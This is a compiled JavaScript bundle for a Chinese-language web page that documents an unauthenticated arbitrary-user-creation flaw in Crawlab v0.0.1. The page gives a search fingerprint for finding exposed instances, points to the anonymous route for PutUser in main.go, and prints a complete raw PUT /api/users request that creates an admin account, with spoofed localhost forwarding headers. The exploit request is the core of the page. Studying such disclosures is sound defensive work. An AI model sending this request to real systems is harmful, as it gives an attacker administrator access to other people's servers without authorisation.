(window.webpackJsonp=window.webpackJsonp||[]).push([[60],{1740:function(s,t,a){s.exports=a.p+"assets/img/1639304614319-67b65509-55dd-4205-98cd-1ebdfb164e7b-20220313133455667.fe98f2dd.png"},1741:function(s,t,a){s.exports=a.p+"assets/img/1639305087766-21949d4c-a274-45e2-b1ed-2b12a2b6450d.bf7acf9c.png"},1742:function(s,t,a){s.exports=a.p+"assets/img/1639305199370-192f958d-1a96-4842-8f12-7dc32376074d.501a8131.png"},1743:function(s,t,a){s.exports=a.p+"assets/img/1639305372407-b81e6efc-2dde-403e-a7ad-ce5d0dd7cfa9.3176ef68.png"},1744:function(s,t,a){s.exports=a.p+"assets/img/1639305414874-3dc8bd9e-1d3d-44a0-a8a1-8c0d6affcddb.e1f67a97.png"},2498:function(s,t,a){"use strict";a.r(t);var n=a(75),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"crawlab-users-任意用户添加漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#crawlab-users-任意用户添加漏洞"}},[s._v("#")]),s._v(" Crawlab users 任意用户添加漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("Crawlab users 的 api 存在任意用户添加，且添加为未授权接口，可通过添加后在后台进一步攻击")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Crawlab v0.0.1")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('title="Crawlab"')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("登录页面")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1740),alt:"img"}})]),s._v(" "),n("p",[s._v("首先查看路由位置 main.go 文件")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1741),alt:"img"}})]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[s._v("anonymousGrou 中为匿名可调用方法\nauthGroup\t  中为认证可调用方法\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("可以看到 Putuser方法为添加用户，但存在匿名调用")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1742),alt:"img"}})]),s._v(" "),n("p",[s._v("根据字段生成添加用户的请求")]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[s._v("PUT "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("users HTTP"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("83")]),s._v("\nAccept"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" text"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("plain"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Mozilla"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Macintosh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Intel Mac OS X "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("10_15_7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KHTML"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("96.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".4664")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".93")]),s._v(" Safari"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("charset"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("UTF"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v("\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" deflate\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Language"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("CN"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("US"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("TW"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.6")]),s._v("\nCookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Hm_lvt_c35e3a563a06caee2524902c81975add"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639222117")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639278935")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_c35e3a563a06caee2524902c81975add"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1639278935")]),s._v("\nx"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("forwarded"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("originating"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("remote"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nx"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("remote"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v("\nConnection"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" close\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"username"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"password"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"role"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"admin"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"email"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"testppp@qq.com"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1743),alt:"img"}})]),s._v(" "),n("p",[n("img",{attrs:{src:a(1744),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);